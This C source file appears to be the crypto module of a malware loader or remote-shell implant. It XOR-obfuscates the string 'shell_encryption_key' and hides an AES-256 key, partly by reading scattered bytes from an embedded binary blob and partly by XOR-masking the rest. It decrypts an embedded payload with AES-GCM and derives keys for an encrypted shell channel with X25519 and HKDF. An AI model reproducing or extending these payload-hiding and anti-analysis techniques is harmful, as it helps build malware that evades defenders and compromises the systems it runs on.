#include "crypto.h"
#include "config.h"
#include <openssl/evp.h>
#include <openssl/kdf.h>
#include <openssl/rand.h>
#include <string.h>

#define STRING_XOR_KEY 0x7A

// Encrypted version of: "shell_encryption_key"
static const uint8_t enc_hkdf_info[] = { 0x09, 0x12, 0x1F, 0x16, 0x16, 0x25, 0x1F, 0x14, 0x19, 0x08, 0x03, 0x0A, 0x0E, 0x13, 0x15, 0x14, 0x25, 0x11, 0x1F, 0x03 };

static char decrypted_hkdf_buf[64];

static char* decrypt_hkdf_string(const uint8_t *encrypted, size_t len) {
    for (size_t i = 0; i < len; i++) {
        decrypted_hkdf_buf[i] = encrypted[i] ^ STRING_XOR_KEY;
    }
    decrypted_hkdf_buf[len] = '\0';
    return decrypted_hkdf_buf;
}

// this one is for retrieving the xored positions 
// 2 bytes since the positions can go up to 1022
uint16_t xor_key_pos[] = {
    0xE3B0, 0x93E6, 0x7C85, 0x368B, 0x2669, 0xCB60, 0x8FF5, 0x3FFA, 0xBACA, 0x2FC3, 0x43CE, 0x9C69, 0x435B, 0xBA03, 0x3983, 0xCED1
};

// this one is for the second part of the AES key, can stay in 1 byte
uint8_t xor_key[] = {
    0xD4, 0xD6, 0x11, 0x9F, 0x28, 0x57, 0xFC, 0x6A,
    0x3E, 0xB5, 0x24, 0x1C, 0x29, 0x10, 0xDD, 0x6B
};

uint16_t xored_key_index_first_chunk[] = {
    0xE08B, 0x913C, 0x7F7B, 0x35B6, 0x25F9, 0xCBDB, 0x8D23, 0x3C65, 0xB98E, 0x2F99, 0x429E, 0x9FAC, 0x4150, 0xBAA1, 0x3894, 0xCCA4
};

uint8_t xored_key_values_second_chunk[] = {
    0x7D, 0xA7, 0x30, 0x5B, 0xBA, 0xE6, 0x81, 0x72, 0xA3, 0x8D, 0x0B, 0x4F, 0x24, 0xA3, 0xF8, 0x01
};

void reconstruct_key(uint8_t *aes_key) {
    // get the cleartext addresses where the first 16 bytes lives
    uint16_t cleartext_positions[16] = {0};
    for(int i = 0; i < sizeof(xor_key_pos) / sizeof(xor_key_pos[0]); i++) {
        cleartext_positions[i] = xor_key_pos[i] ^ xored_key_index_first_chunk[i];
    }

    for (int i = 0; i < 16; i++) {
        aes_key[i] = _binary_grid_bin_start[cleartext_positions[i]];
    }

    // get the rest of the key. we flip the xor key and decrypt the second chunk
    for (int i = 0; i < 16; i++) {
        aes_key[16+i] = xor_key[15-i] ^ xored_key_values_second_chunk[i];
    }
}

int decrypt_payload(uint8_t *nonce, uint8_t *aes_key, uint8_t *ciphertext, uint8_t *tag, uint8_t *plaintext) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    int len = 0, ok = 0;

    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, NONCE_LEN, NULL);
    EVP_DecryptInit_ex(ctx, NULL, NULL, aes_key, nonce);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, TAG_LEN, tag);
    EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, CT_LEN);
    ok = EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
    EVP_CIPHER_CTX_free(ctx);

    return ok;
}

int x25519_generate_keypair(X25519_Keypair *keypair) {
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_X25519, NULL);
    if (!ctx) return -1;

    EVP_PKEY *pkey = NULL;
    if (EVP_PKEY_keygen_init(ctx) <= 0) {
        EVP_PKEY_CTX_free(ctx);
        return -1;
    }

    if (EVP_PKEY_keygen(ctx, &pkey) <= 0) {
        EVP_PKEY_CTX_free(ctx);
        return -1;
    }

    size_t len = X25519_KEYLEN;
    if (EVP_PKEY_get_raw_private_key(pkey, keypair->private_key, &len) <= 0) {
        EVP_PKEY_free(pkey);
        EVP_PKEY_CTX_free(ctx);
        return -1;
    }

    len = X25519_KEYLEN;
    if (EVP_PKEY_get_raw_public_key(pkey, keypair->public_key, &len) <= 0) {
        EVP_PKEY_free(pkey);
        EVP_PKEY_CTX_free(ctx);
        return -1;
    }

    EVP_PKEY_free(pkey);
    EVP_PKEY_CTX_free(ctx);
    return 0;
}

int x25519_compute_shared_secret(uint8_t *shared_secret, const uint8_t *private_key, const uint8_t *peer_public_key) {
    EVP_PKEY_CTX *ctx = NULL;
    EVP_PKEY *private_pkey = NULL;
    EVP_PKEY *peer_pkey = NULL;
    int ret = -1;

    private_pkey = EVP_PKEY_new_raw_private_key(EVP_PKEY_X25519, NULL, private_key, X25519_KEYLEN);
    if (!private_pkey) return -1;

    peer_pkey = EVP_PKEY_new_raw_public_key(EVP_PKEY_X25519, NULL, peer_public_key, X25519_KEYLEN);
    if (!peer_pkey) {
        EVP_PKEY_free(private_pkey);
        return -1;
    }

    ctx = EVP_PKEY_CTX_new(private_pkey, NULL);
    if (!ctx) {
        EVP_PKEY_free(peer_pkey);
        EVP_PKEY_free(private_pkey);
        return -1;
    }

    if (EVP_PKEY_derive_init(ctx) <= 0) goto cleanup;
    if (EVP_PKEY_derive_set_peer(ctx, peer_pkey) <= 0) goto cleanup;

    size_t secret_len = X25519_SHARED_SECRET_LEN;
    if (EVP_PKEY_derive(ctx, shared_secret, &secret_len) <= 0) goto cleanup;

    ret = 0;

cleanup:
    EVP_PKEY_CTX_free(ctx);
    EVP_PKEY_free(peer_pkey);
    EVP_PKEY_free(private_pkey);
    return ret;
}

int hkdf_derive_key(uint8_t *derived_key, const uint8_t *shared_secret, uint32_t shared_secret_len) {
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_HKDF, NULL);
    if (!ctx) return -1;

    int ret = -1;
    // Encrypted version of: "shell_encryption_key"
    char *info_str = decrypt_hkdf_string(enc_hkdf_info, sizeof(enc_hkdf_info));
    size_t info_len = sizeof(enc_hkdf_info);

    if (EVP_PKEY_derive_init(ctx) <= 0) goto cleanup;
    if (EVP_PKEY_CTX_set_hkdf_md(ctx, EVP_sha256()) <= 0) goto cleanup;
    if (EVP_PKEY_CTX_set1_hkdf_key(ctx, shared_secret, shared_secret_len) <= 0) goto cleanup;
    if (EVP_PKEY_CTX_add1_hkdf_info(ctx, (uint8_t *)info_str, info_len) <= 0) goto cleanup;

    size_t outlen = AES_KEY_LEN;
    if (EVP_PKEY_derive(ctx, derived_key, &outlen) <= 0) goto cleanup;

    ret = 0;

cleanup:
    EVP_PKEY_CTX_free(ctx);
    return ret;
}

int encrypt_aes_gcm(uint8_t *ciphertext, uint8_t *tag, const uint8_t *plaintext, uint32_t plaintext_len, const uint8_t *key, uint8_t *nonce) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    int len = 0;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) <= 0) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, NONCE_LEN, NULL);

    if (EVP_EncryptInit_ex(ctx, NULL, NULL, key, nonce) <= 0) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    if (EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len) <= 0) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    int ciphertext_len = len;

    if (EVP_EncryptFinal_ex(ctx, ciphertext + len, &len) <= 0) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    ciphertext_len += len;

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_LEN, tag) <= 0) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    EVP_CIPHER_CTX_free(ctx);
    return ciphertext_len;
}

int decrypt_aes_gcm(uint8_t *plaintext, const uint8_t *ciphertext, uint32_t ciphertext_len, const uint8_t *tag, const uint8_t *key, const uint8_t *nonce) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    int len = 0, ok = 0;

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) <= 0) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, NONCE_LEN, NULL);

    if (EVP_DecryptInit_ex(ctx, NULL, NULL, key, (uint8_t*)nonce) <= 0) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, TAG_LEN, (uint8_t*)tag);

    if (EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len) <= 0) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    ok = EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
    EVP_CIPHER_CTX_free(ctx);

    return ok;
}
